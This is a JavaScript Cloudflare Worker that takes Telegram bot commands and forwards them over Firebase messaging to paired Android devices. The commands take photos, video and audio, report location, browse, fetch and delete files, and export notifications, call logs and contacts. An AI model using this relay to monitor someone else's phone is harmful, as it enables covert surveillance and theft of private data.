function base64url(uint8Array) {
  let str = String.fromCharCode(...uint8Array);
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// Utility: import PEM private key
async function importPrivateKey(pem) {
  let b64 = pem
    .replace(/-----BEGIN PRIVATE KEY-----/, "")
    .replace(/-----END PRIVATE KEY-----/, "")
    .replace(/\n/g, "");
  let binary = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return crypto.subtle.importKey(
    "pkcs8",
    binary.buffer,
    {
      name: "RSASSA-PKCS1-v1_5",
      hash: { name: "SHA-256" }
    },
    false,
    ["sign"]
  );
}

// Utility: generate JWT for Google OAuth2
async function generateJWT({ client_email, private_key }) {
  const iat = Math.floor(Date.now() / 1000);
  const exp = iat + 60 * 60; // 1 hour
  const header = { alg: "RS256", typ: "JWT" };
  const payload = {
    iss: client_email,
    scope: "https://www.googleapis.com/auth/firebase.messaging",
    aud: "https://oauth2.googleapis.com/token",
    iat: iat,
    exp: exp,
  };
  const encoder = new TextEncoder();
  const headerB64 = base64url(encoder.encode(JSON.stringify(header)));
  const payloadB64 = base64url(encoder.encode(JSON.stringify(payload)));
  const toSign = `${headerB64}.${payloadB64}`;
  const key = await importPrivateKey(private_key);
  const signature = await crypto.subtle.sign(
    "RSASSA-PKCS1-v1_5",
    key,
    encoder.encode(toSign)
  );
  const signatureB64 = base64url(new Uint8Array(signature));
  return `${toSign}.${signatureB64}`;
}

// Utility: get Google OAuth2 access token for FCM
async function getAccessToken({ client_email, private_key }) {
  const jwt = await generateJWT({ client_email, private_key });
  const resp = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=${jwt}`
  });
  if (!resp.ok) {
    throw new Error("Failed to get access token: " + await resp.text());
  }
  const data = await resp.json();
  return data.access_token;
}

export default {
  async fetch(request, env, ctx) {
    const register = env.register;
    try {
      const url = new URL(request.url);

      // --- REGISTRATION ENDPOINT ---
      if (url.pathname === "/register_nickname" && request.method === "POST") {
        let body;
        try {
          body = await request.json();
        } catch {
          return new Response("Invalid JSON", { status: 400 });
        }
        const { bot_token, nickname, fcm_token } = body;
        if (!bot_token || !nickname || !fcm_token) {
          return new Response("Missing fields", { status: 400 });
        }
        const nickKey = `nickmap:${bot_token}:${nickname}`;
        let existing = await register.get(nickKey);
        let arr = [];
        if (existing) {
          try { arr = JSON.parse(existing); } catch { }
        }
        if (!arr.includes(fcm_token)) arr.push(fcm_token);
        await register.put(nickKey, JSON.stringify(arr));
        return new Response("OK", { status: 200 });
      }

      if (request.method !== "POST") {
        return new Response("OK", { status: 200 });
      }

      let rawBody = await request.clone().text();

      const match = url.pathname.match(/^\/bot([0-9]+:[A-Za-z0-9_-]{30,})\/?$/);
      if (!match) {
        return new Response("Invalid URL. Use /bot<BOT_TOKEN> as the path.", { status: 200 });
      }
      const botToken = match[1];

      // Load credentials from environment
      const client_email = env.GCP_CLIENT_EMAIL;
      const private_key = env.GCP_PRIVATE_KEY.replace(/\\n/g, '\n');
      const project_id = env.GCP_PROJECT_ID;

      let body;
      try {
        body = JSON.parse(rawBody);
      } catch (e) {
        return new Response("Bad Request", { status: 200 });
      }

      // --- REGISTRATION VIA /register <nickname> ---
      if (body.message && body.message.text && body.message.text.trim().startsWith("/register ")) {
        const msg = body.message;
        const chatId = msg.chat.id;
        const text = msg.text.trim();
        const nickname = text.split(/\s+/)[1];
        const nickKey = `nickmap:${botToken}:${nickname}`;
        const fcmKey = `fcm:${botToken}:${chatId}`;

        // Get existing FCM tokens for this chat (multi-device support)
        let chatTokensArr = [];
        let alreadyMapped = await register.get(fcmKey);
        if (alreadyMapped) {
          try { chatTokensArr = JSON.parse(alreadyMapped); } catch { }
        }

        // Get pending registration tokens for this nickname
        let pending = await register.get(nickKey);
        let pendingArr = [];
        if (pending) {
          try { pendingArr = JSON.parse(pending); } catch { }
        }

        // Merge pending tokens into chatTokensArr
        let newTokensAdded = false;
        for (const token of pendingArr) {
          if (!chatTokensArr.includes(token)) {
            chatTokensArr.push(token);
            newTokensAdded = true;
          }
        }

        if (chatTokensArr.length === 0) {
          // Nothing to register!
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: "❌ Registration failed: no device found for this nickname. Please click Save & Continue from app settings and use correct /register <nickname> again",
            }),
          });
          await register.delete(nickKey);
          return new Response("No device found for this nickname", { status: 200 });
        }

        await register.put(fcmKey, JSON.stringify(chatTokensArr));
        await register.delete(nickKey);

        // If tokens were added, inform user it's now registered; if not, "already paired"
        const replyMsg = newTokensAdded
          ? "✅ Registration complete! Your device is now paired and ready to receive commands."
          : "✅ Your device is already paired and ready.";

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: replyMsg,
          }),
        });

        return new Response("Registered", { status: 200 });
      }

      // ===========================================
      // === FCM COMMAND DISPATCH (BY chat_id) ====
      // ===========================================
      let fcmPayload = {};
      let chatId;

      if (body.callback_query) {
        // 1. Handle inline keyboard callback_query
        const cq = body.callback_query;
        chatId = cq.message.chat.id;
        const data = cq.data;

        if (data.startsWith("sendnav:") || data.startsWith("sendplace:")) {
          fcmPayload.type = "send";
          fcmPayload.callback_data = data;
        } else if (data.startsWith("list:")) {
          fcmPayload.type = "list";
          fcmPayload.path = data.slice(5);
        } else if (data.startsWith("file:")) {
          fcmPayload.type = "file";
          fcmPayload.file = data.slice(5);
        } else if (data.startsWith("recv:")) {
          fcmPayload.type = "recv";
          fcmPayload.file = data.slice(5);
        } else if (data.startsWith("del:")) {
          fcmPayload.type = "del";
          fcmPayload.file = data.slice(4);
        } else if (data.startsWith("nav:")) {
          fcmPayload.type = "list";
          fcmPayload.path = data.slice(4);
        } else if (data.startsWith("notiaddpick:")) {
          fcmPayload.type = "notiaddpick";
          fcmPayload.pkg = data.slice("notiaddpick:".length);
        } else if (data.startsWith("notiremovepick:")) {
          fcmPayload.type = "notiremovepick";
          fcmPayload.pkg = data.slice("notiremovepick:".length);
        } else if (data.startsWith("notipick:")) {
          fcmPayload.type = "notipick";
          fcmPayload.pkg = data.slice("notipick:".length);
        } else if (data.startsWith("noticlearpick:")) {
          fcmPayload.type = "noticlearpick";
          fcmPayload.pkg = data.slice("noticlearpick:".length);
        } else if (data.startsWith("notiexportpick:")) {
          fcmPayload.type = "notiexportpick";
          fcmPayload.pkg = data.slice("notiexportpick:".length);
        }
        // --- ADD NAVIGATION CALLBACKS ---
        else if (data.startsWith("notiaddpicknav:")) {
          fcmPayload.type = "notiaddpicknav";
          fcmPayload.page = parseInt(data.slice("notiaddpicknav:".length)) || 0;
        } else if (data.startsWith("notiremovepicknav:")) {
          fcmPayload.type = "notiremovepicknav";
          fcmPayload.page = parseInt(data.slice("notiremovepicknav:".length)) || 0;
        } else if (data.startsWith("noticlearpicknav:")) {
          fcmPayload.type = "noticlearpicknav";
          fcmPayload.page = parseInt(data.slice("noticlearpicknav:".length)) || 0;
        } else if (data.startsWith("notiexportpicknav:")) {
          fcmPayload.type = "notiexportpicknav";
          fcmPayload.page = parseInt(data.slice("notiexportpicknav:".length)) || 0;
        }
        // --- NEW: Call logs and contacts buttons ---
        else if (data === "calllogs") {
          fcmPayload.type = "calllogs";
        } else if (data === "contacts") {
          fcmPayload.type = "contacts";
        }
        fcmPayload.chat_id = `${chatId}`;
        fcmPayload.bot_token = botToken;

        try {
          await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cq.id }),
          });
        } catch (e) { }
      }
      else if (body.message && body.message.caption && body.message.caption.trim().startsWith("/send")) {
        // 2. Handle /send as caption on a file upload
        const msg = body.message;
        chatId = msg.chat.id;
        const parts = msg.caption.trim().split(/\s+/);
        const target_path = parts[1] || "";

        let doc = msg.document || (msg.photo ? msg.photo.slice(-1)[0] : null) || msg.video || msg.audio;
        if (!doc) {
          return new Response("No file attached to /send", { status: 200 });
        }

        let file_id, file_name_guess;
        if (msg.document) {
          file_id = msg.document.file_id;
          file_name_guess = msg.document.file_name || "file";
        } else if (msg.photo) {
          file_id = doc.file_id;
          file_name_guess = "photo.jpg";
        } else if (msg.video) {
          file_id = msg.video.file_id;
          file_name_guess = "video.mp4";
        } else if (msg.audio) {
          file_id = msg.audio.file_id;
          file_name_guess = "audio.mp3";
        }

        const resp = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${file_id}`);
        const data = await resp.json();
        if (!data.ok) {
          return new Response("Failed to get file path from Telegram", { status: 200 });
        }
        const file_path = data.result.file_path;
        const file_url = `https://api.telegram.org/file/bot${botToken}/${file_path}`;
        const file_name = file_name_guess;

        fcmPayload.type = "send";
        fcmPayload.file_url = file_url;
        fcmPayload.file_name = file_name;
        fcmPayload.target_path = target_path;
        fcmPayload.chat_id = `${chatId}`;
        fcmPayload.bot_token = botToken;
      }
      else if (body.message && body.message.text) {
        // 3. Handle plain text commands (most commands)
        const msg = body.message;
        chatId = msg.chat.id;
        const text = msg.text.trim();
        const [command, ...args] = text.split(/\s+/);

        switch (command) {
          case "/photo":
            fcmPayload.type = "photo";
            fcmPayload.camera = (args[0] || "front").toLowerCase();
            fcmPayload.flash = (args[1] && args[1].toLowerCase() === "flash_on") ? "true" : "false";
            fcmPayload.quality = "1080";
            break;
          case "/video":
            fcmPayload.type = "video";
            fcmPayload.camera = (args[0] || "front").toLowerCase();
            fcmPayload.flash = (args[1] && args[1].toLowerCase() === "flash_on") ? "true" : "false";
            fcmPayload.duration = args[2] || "1";
            fcmPayload.quality = args[3] || "480";
            break;
          case "/audio":
            fcmPayload.type = "audio";
            fcmPayload.duration = args[0] || "1";
            break;
          case "/location":
            fcmPayload.type = "location";
            break;
          case "/ring":
            fcmPayload.type = "ring";
            break;
          case "/vibrate":
            fcmPayload.type = "vibrate";
            break;
          case "/list":
            let sort = "date";
            let order = "desc";
            let listPath = "";

            if (args.length > 0) {
              const sortModes = ["name", "size", "date", "type"];
              if (sortModes.includes(args[0].toLowerCase())) {
                sort = args[0].toLowerCase();
                args.shift();
              }
              if (args.length > 0 && (args[0].toLowerCase() === "asc" || args[0].toLowerCase() === "desc")) {
                order = args[0].toLowerCase();
                args.shift();
              }
              if (args.length > 0) {
                listPath = args.join(" ");
              }
            }

            fcmPayload.type = "list";
            fcmPayload.sort = sort;
            fcmPayload.order = order;
            fcmPayload.path = listPath;
            break;
          case "/notiadd":
            fcmPayload.type = "notiadd";
            break;
          case "/notiaddpick":
            fcmPayload.type = "notiaddpick";
            fcmPayload.pkg = args[0] || "";
            break;
          case "/notiremove":
            fcmPayload.type = "notiremove";
            break;
          case "/notiremovepick":
            fcmPayload.type = "notiremovepick";
            fcmPayload.pkg = args[0] || "";
            break;
          case "/noti":
            fcmPayload.type = "noti";
            break;
          case "/notipick":
            fcmPayload.type = "notipick";
            fcmPayload.pkg = args[0] || "";
            break;
          case "/noticlear":
            fcmPayload.type = "noticlear";
            break;
          case "/noticlearpick":
            fcmPayload.type = "noticlearpick";
            fcmPayload.pkg = args[0] || "";
            break;
          case "/notiexport":
            fcmPayload.type = "notiexport";
            break;
          case "/notiexportpick":
            fcmPayload.type = "notiexportpick";
            fcmPayload.pkg = args[0] || "";
            break;
          // --- NEW: Support /calllogs and /contacts commands (text) ---
          case "/calllogs":
            fcmPayload.type = "calllogs";
            break;
          case "/contacts":
            fcmPayload.type = "contacts";
            break;
          default:
            return new Response("Unknown command", { status: 200 });
        }
        fcmPayload.chat_id = `${chatId}`;
        fcmPayload.bot_token = botToken;
      } else {
        return new Response("Ignored", { status: 200 });
      }

      // ==== ONLY DISPATCH FCM TO REGISTERED chat_id ====
      if (Object.keys(fcmPayload).length > 0 && chatId) {
        const fcmKey = `fcm:${botToken}:${chatId}`;
        let tokensJson = await register.get(fcmKey);
        if (!tokensJson) {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: "No device registered for this chat. Please complete registration in your device app and then use /register <nickname> again.",
            }),
          });
          return new Response("No device registered for this chat", { status: 200 });
        }
        try {
          const accessToken = await getAccessToken({ client_email, private_key });
          const fcmUrl = `https://fcm.googleapis.com/v1/projects/${project_id}/messages:send`;
          const tokens = JSON.parse(tokensJson);
          for (const fcmToken of tokens) {
            const fcmBody = {
              message: {
                token: fcmToken,
                data: fcmPayload,
                android: {
                  priority: "HIGH"
                }
              }
            };
            let fcmResp = await fetch(fcmUrl, {
              method: "POST",
              headers: {
                Authorization: `Bearer ${accessToken}`,
                "Content-Type": "application/json",
              },
              body: JSON.stringify(fcmBody),
            });
            let fcmRespText = await fcmResp.text();

            // Log FCM request/response for debugging
            console.log("FCM request:", JSON.stringify(fcmBody));
            console.log("FCM response:", fcmResp.status, fcmRespText);

            // Clean up UNREGISTERED tokens and notify user
            if (!fcmResp.ok) {
              try {
                const fcmRespJson = JSON.parse(fcmRespText);
                if (
                  fcmRespJson?.error?.details?.some(d => d.errorCode === "UNREGISTERED")
                ) {
                  // --- DELETE the entire FCM key ---
                  await register.delete(fcmKey);

                  // --- DELETE nickmap key(s) associated with this chat and botToken ---
                  // Get all nickmap keys for this botToken (requires listing keys, which Workers KV supports)
                  // This will only work if the environment binding supports `list`.
                  let nicknameKeys = [];
                  if (typeof register.list === "function") {
                    const listResult = await register.list({ prefix: `nickmap:${botToken}:` });
                    nicknameKeys = listResult.keys.map(k => k.name);
                  }
                  // For each nickmap, remove this fcmToken from the array, and if array is empty, delete key
                  for (const nickKey of nicknameKeys) {
                    let arrStr = await register.get(nickKey);
                    let arr = [];
                    if (arrStr) {
                      try { arr = JSON.parse(arrStr); } catch { }
                    }
                    // Remove the unregistered token from the list
                    arr = arr.filter(t => t !== fcmToken);
                    if (arr.length === 0) {
                      await register.delete(nickKey);
                    } else {
                      await register.put(nickKey, JSON.stringify(arr));
                    }
                  }

                  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: "⚠️ Your device is no longer registered for receiving commands (possibly due to app uninstall/reinstall). Please re-register from your device app and then use /register <nickname> again.",
                    }),
                  });
                }
              } catch (e) { }
            }
          }
        } catch (e) {
          // Optionally log error for debugging
          console.log("FCM dispatch failed:", e);
        }
      }

      return new Response("OK", { status: 200 });
    } catch (err) {
      // Optionally log error for debugging
      console.log("Unhandled error:", err);
      return new Response("Unhandled error", { status: 200 });

    }}}
